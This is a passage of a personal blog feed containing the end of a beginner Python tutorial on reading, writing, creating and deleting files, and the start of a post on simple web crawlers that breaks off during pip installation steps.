</span></span><span class="line"><span class="cl">Hello!I love Python.
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="reading-lines">Reading lines</h3>
<p>File:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/home/weepingdogel/test.txt
</span></span><span class="line"><span class="cl">---
</span></span><span class="line"><span class="cl">Hello!I love Python.
</span></span><span class="line"><span class="cl">Have a nice day!
</span></span><span class="line"><span class="cl">Good luck!
</span></span></code></pre></td></tr></table>
</div>
</div><p>When we encounter a multiline file, we can choose to read only one line at a time using <code>f.readline()</code></p>
<p>For example:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;test.txt&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Output:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">weepingdogel@WeepingDogel ~&gt; python test.py
</span></span><span class="line"><span class="cl">Hello!I love Python.
</span></span></code></pre></td></tr></table>
</div>
</div><p>If we need two lines:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;test.txt&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Output:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">weepingdogel@WeepingDogel ~&gt; python test.py
</span></span><span class="line"><span class="cl">Hello!I love Python.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Have a nice day!
</span></span></code></pre></td></tr></table>
</div>
</div><p>If we need three lines:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;test.txt&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">readline</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Output:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">weepingdogel@WeepingDogel ~&gt; python test.py
</span></span><span class="line"><span class="cl">Hello!I love Python.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Have a nice day!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Good luck!
</span></span></code></pre></td></tr></table>
</div>
</div><p>This usage reads line by line and prints with line breaks.</p>
<p>You may need it when reading configuration files&hellip;</p>
<p>Of course, we can also use a <code>for()</code> loop to read all lines at once:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;test.txt&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Output:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">weepingdogel@WeepingDogel ~&gt; python test.py
</span></span><span class="line"><span class="cl">Hello!I love Python.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Have a nice day!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Good luck!
</span></span></code></pre></td></tr></table>
</div>
</div><p>I think using <code>for</code> is more efficient&hellip;</p>
<h3 id="closing-files">Closing files</h3>
<p>Nothing much to say here&hellip;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;test.txt&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The effect is similar to the previous example.</p>
<blockquote>
<p>I won&rsquo;t provide debugging results below, it&rsquo;s too late.</p>
</blockquote>
<h3 id="creating">Creating</h3>
<p><strong>&ldquo;x&rdquo;</strong> indicates creating a new file. If the specified filename already exists, an error will be returned.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">,</span><span class="s2">&#34;x&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Try it out yourself, nothing much else.</p>
<h3 id="writing-to-a-file">Writing to a file</h3>
<p>The character <code>'a'</code> represents adding content to an existing file without deleting or overwriting its original contents.</p>
<p>For example:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">,</span><span class="s2">&#34;a&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&#34;加入内容 / content added.&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The above string will be added to the file.</p>
<p>The character <code>'w'</code> represents overwriting the file, which will replace any existing content.</p>
<p>For example:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&#34;加入内容 / content added.&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>In this case, only the string specified will exist in the file.</p>
<h3 id="deleting-a-file">Deleting a file</h3>
<p>You need to use the <code>os</code> module and its <code>os.remove()</code> function. Simply type <code>import os</code> to import it.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="classic-example">Classic example</h4>
<p>Check if a file exists, delete it if it does, or display a message if it doesn&rsquo;t.</p>
<h4 id="deleting-a-directory">Deleting a directory</h4>
<p>Use <code>os.rmdir()</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">rmdir</span><span class="p">(</span><span class="s2">&#34;foldername&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="conclusion">Conclusion</h2>
<p>These are the basics of file read/write operations that you should know.</p>
<p>If you&rsquo;re having trouble understanding, you can try running the following code with different <code>open()</code> mode parameters.</p>
<p>Summary code:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">datetime</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">sign</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Program identification</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">╭╮╭╮╭╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━━━╮╱╱╱╱╱╱╱╱╭╮
</span></span></span><span class="line"><span class="cl"><span class="s1">┃┃┃┃┃┃╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰╮╭╮┃╱╱╱╱╱╱╱╱┃┃
</span></span></span><span class="line"><span class="cl"><span class="s1">┃┃┃┃┃┣━━┳━━┳━━┳┳━╮╭━━╮┃┃┃┣━━┳━━┳━━┫┃
</span></span></span><span class="line"><span class="cl"><span class="s1">┃╰╯╰╯┃┃━┫┃━┫╭╮┣┫╭╮┫╭╮┃┃┃┃┃╭╮┃╭╮┃┃━┫┃
</span></span></span><span class="line"><span class="cl"><span class="s1">╰╮╭╮╭┫┃━┫┃━┫╰╯┃┃┃┃┃╰╯┣╯╰╯┃╰╯┃╰╯┃┃━┫╰╮
</span></span></span><span class="line"><span class="cl"><span class="s1">╱╰╯╰╯╰━━┻━━┫╭━┻┻╯╰┻━╮┣━━━┻━━┻━╮┣━━┻━╯
</span></span></span><span class="line"><span class="cl"><span class="s1">╱╱╱╱╱╱╱╱╱╱╱┃┃╱╱╱╱╱╭━╯┃╱╱╱╱╱╱╭━╯┃
</span></span></span><span class="line"><span class="cl"><span class="s1">╱╱╱╱╱╱╱╱╱╱╱╰╯╱╱╱╱╱╰━━╯╱╱╱╱╱╱╰━━╯
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">filecrt</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># File creation</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span> <span class="c1"># Check if the file exists</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">())</span> <span class="o">+</span> <span class="s2">&#34;: The file already exists&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span><span class="s1">&#39;x&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">())</span> <span class="o">+</span> <span class="s2">&#34;: Created file: &#34;</span> <span class="o">+</span> <span class="n">filename</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">filewrt</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">fruits</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;apple&#39;</span><span class="p">,</span> <span class="s1">&#39;banana&#39;</span><span class="p">,</span> <span class="s1">&#39;strawberry&#39;</span><span class="p">,</span><span class="s1">&#39;orange&#39;</span><span class="p">]</span> <span class="c1"># Specify the contents to be written</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># File write operation</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">fruit</span> <span class="ow">in</span> <span class="n">fruits</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">fruit</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">())</span> <span class="o">+</span> <span class="s2">&#34;: Writing: &#34;</span> <span class="o">+</span> <span class="n">fruit</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">filedel</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Delete file operation</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">())</span> <span class="o">+</span> <span class="s2">&#34;: Deleted file: &#34;</span> <span class="o">+</span> <span class="n">filename</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">())</span> <span class="o">+</span> <span class="s2">&#34;: &#34;</span> <span class="o">+</span> <span class="n">filename</span> <span class="o">+</span> <span class="s2">&#34; does not exist&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">fileread</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">())</span> <span class="o">+</span> <span class="s2">&#34;: Reading...&#34;</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;-&#34;</span> <span class="o">*</span> <span class="mi">5</span> <span class="o">+</span> <span class="s2">&#34; File contents &#34;</span> <span class="o">+</span> <span class="s2">&#34;-&#34;</span> <span class="o">*</span> <span class="mi">5</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;-&#34;</span> <span class="o">*</span> <span class="mi">5</span> <span class="o">+</span> <span class="s2">&#34; File contents &#34;</span> <span class="o">+</span> <span class="s2">&#34;-&#34;</span> <span class="o">*</span> <span class="mi">5</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">sign</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">filecrt</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">fileread</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">filedel</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">filewrt</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">fileread</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">filedel</span><span class="p">(</span><span class="s2">&#34;test.txt&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div>]]></description>
</item><item>
    <title>Python Learning Notes: Simple Web Crawler</title>
    <link>http://weepingdogel.github.io/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/</link>
    <pubDate>Tue, 13 Aug 2019 22:20:53 &#43;0800</pubDate>
    <author>Author</author>
    <guid>http://weepingdogel.github.io/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/images/wallhaven-ey71wo.jpg" referrerpolicy="no-referrer">
            </div><h2 id="a-casual-preface">A Casual Preface</h2>
<p>Hey, I&rsquo;m back. Today, I set up hexo in my U-disk, so I can continue to update my blog.</p>
<p><del>And this time I added a visitor counter to my blog. Feel free to help increase the count!～</del></p>
<p>So, in this post, I will introduce a simple web crawler implemented in Python.</p>
<h2 id="principles-of-web-crawlers">Principles of Web Crawlers</h2>
<blockquote>
<p>Beginner: Hey there, what is a web crawler?</p>
<p>Expert: Go search it on a search engine.</p>
<p>Beginner: I did, but I still don&rsquo;t understand it.</p>
<p>Expert: Uh&hellip;then keep reading&hellip;</p>
</blockquote>
<h3 id="overview">Overview</h3>
<p>To put it simply, a web crawler automates the process of browsing web pages to extract desired information and content from them.</p>
<p>We all know that we use web browsers to access the Internet. So how do we visit a webpage? Here&rsquo;s a brief overview (I&rsquo;m too lazy to draw):</p>
<blockquote>
<ol>
<li>
<p>Browser –Sends a request for <a href="https://www.bing.com" target="_blank" rel="noopener noreffer">www.bing.com</a>–&gt;</p>
</li>
<li>
<p>Server &lt;–Receives the request–</p>
</li>
<li>
<p>Server –Responds with data–&gt; –Returns the data–&gt; Browser</p>
</li>
</ol>
</blockquote>
<p>What? Still confused? Let&rsquo;s take a look using a browser. Open any webpage.</p>
<p></p>
<p>Using Chrome/Chromium as an example, right-click and select &ldquo;Inspect&rdquo;, then go to the &ldquo;Network&rdquo; tab, and check the &ldquo;Preserve log&rdquo; checkbox. Refresh the page and you&rsquo;ll see the following content:</p>
<p></p>
<p>As you can see, the browser displays the request content in great detail. And the left lists are the contents you retrieve from the website.</p>
<p>A web crawler automates these processes so that we don&rsquo;t need to visit websites manually to get the information we want.</p>
<h3 id="the-purpose-of-web-crawlers">The Purpose of Web Crawlers</h3>
<p>For example, let&rsquo;s say there is a website <del><a href="http://www.hiphop8.com/" target="_blank" rel="noopener noreffer">全国号码段(链接已失效)</a></del> where we need to obtain all the phone numbers of one of the phone number segments in a city, such as Xi&rsquo;an.</p>
<p></p>
<p></p>
<p>As you can see, there are many phone number segments, each with ten thousand phone numbers. What should we do? Can&rsquo;t we copy and paste them one by one using the mouse, right? This is where web crawlers come into play.</p>
<blockquote>
<p>Actually, it can also be used to crawl my blog so that you can receive update information in a timely manner.</p>
<p>Ah, please don&rsquo;t hit me, it hurts!</p>
</blockquote>
<h2 id="choosing-a-programming-language">Choosing a Programming Language</h2>
<p>To perform web crawling, we need to use a programming language. The most commonly used one is <strong>Python</strong> because it is easy to use for web crawling. However, you can also choose other languages such as <strong>C/C++</strong>, <strong>Java</strong>, or even <strong>Visual Basic</strong>. The level of difficulty and coding methods may be different, but the purpose and functionality are the same. In this post, we will choose <strong>Python</strong>.</p>
<h2 id="installing-python">Installing Python</h2>
<p>Python is a cross-platform language, so installation methods differ depending on the platform.</p>
<h3 id="windows">Windows</h3>
<p>You can download the installation program from <a href="https://www.python.org/" target="_blank" rel="noopener noreffer">Python&rsquo;s official website</a> and install it. It is recommended to download Python 3.</p>
<h3 id="mac-osx">Mac OSX</h3>
<p>Download it from <a href="https://www.python.org/" target="_blank" rel="noopener noreffer">Python&rsquo;s official website</a></p>
<h3 id="linux">Linux</h3>
<p>Install it via package manager.</p>
<h4 id="deb-based">deb-based</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo apt-get install python3
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="arch-based">Arch-based</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S python
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="rpm-based">rpm-based</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo yum install python3
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="android">Android</h3>
<p>Install QPython on the Android platform:</p>
<p><a href="https://www.coolapk.com/apk/com.hipipal.qpy3" target="_blank" rel="noopener noreffer">Download it from Coolapk</a></p>
<p><a href="https://www.qpython.com/" target="_blank" rel="noopener noreffer">QPython Official Website</a></p>
<h2 id="installing-pip">Installing pip</h2>
<p>The installation programs for Windows and Mac OS X will automatically install pip, but Linux does not. We need to install it manually.</p>
<blockquote>
<p>What? You&rsquo;re asking about Android? I don&rsquo;t know either, hahaha.</p>
</blockquote>
<p>First, go to <a href="https://pypi.org/project/pip/#files" target="_blank" rel="noopener noreffer">this website</a>，and click <strong>Download</strong>，Download the second tar.gz file, which is a Linux compressed file.</p>
<p>Then, extract it to get a <code>pip-19.2.2</code> directory:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ tar -xvf pip-19.2.2.tar.gz
</span></span></code></pre></td></tr></table>
</div>
</div><p>Enter the directory:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ <span class="nb">cd</span> ./pip-19.2.2
